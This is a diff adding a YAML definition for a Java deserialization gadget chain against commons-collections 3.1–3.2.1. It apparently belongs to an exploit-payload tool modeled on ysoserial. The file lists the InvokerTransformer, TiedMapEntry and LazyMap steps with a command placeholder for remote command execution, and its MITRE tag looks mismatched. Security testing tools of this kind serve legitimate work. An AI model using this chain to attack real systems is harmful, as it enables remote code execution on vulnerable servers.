@@ -1,0 +1,24 @@
+name: "CommonsCollectionsK1"
+category: "commons_collections"
+description: "CommonsCollectionsK1 - KernelSec variant 1"
+jdk_version: "all"
+dependencies:
+  - name: "commons-collections"
+    version: "3.1-3.2.1"
+exploit_type: "command_execution"
+payload_type: "command"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/wh1t3p1g/ysoserial"
+steps:
+  - class_name: "org.apache.commons.collections.functors.InvokerTransformer"
+    method_name: "transform"
+    parameters: []
+  - class_name: "org.apache.commons.collections.keyvalue.TiedMapEntry"
+    method_name: "hashCode"
+    parameters: []
+  - class_name: "org.apache.commons.collections.map.LazyMap"
+    method_name: "decorate"
+    parameters:
+      - "{command}"
